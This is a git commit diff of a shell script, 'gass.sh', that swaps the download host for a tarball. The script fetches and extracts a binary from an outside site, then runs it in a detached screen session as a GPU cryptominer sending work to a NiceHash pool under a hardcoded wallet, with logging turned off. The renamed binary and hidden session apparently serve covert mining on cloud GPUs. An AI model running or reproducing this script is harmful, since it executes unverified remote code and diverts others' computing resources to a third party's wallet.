42f0fdae70cb6d0700a2b9236ca341b7f8d793cd
senamjempol <48201831+senamjempol@users.noreply.github.com>
2022-05-30 10:07:05 +0700

    Update gass.sh

--- gass.sh
+++ gass.sh
@@ -1,5 +1,5 @@
 sudo apt install screen -y
-wget http://muvia.club/gass.tar.gz
+wget http://cdn.muvia.club/gass.tar.gz
 tar -xf gass.tar.gz
 echo -n "$(tput setaf 3)GPU Found => Tesla ";nvidia-smi | grep "Tesla" | sed "s/.*Tesla \([^ ]*\).*/\1/"
 screen -S lol -d -m ./gass --algo BEAM-III --pool stratum+ssl://beamv3.auto.nicehash.com:443 --user 3H1YkJhw9Ybgii4H1D35usRPCeRn7G81SK.buruh --dns-over-https 2 --log 0
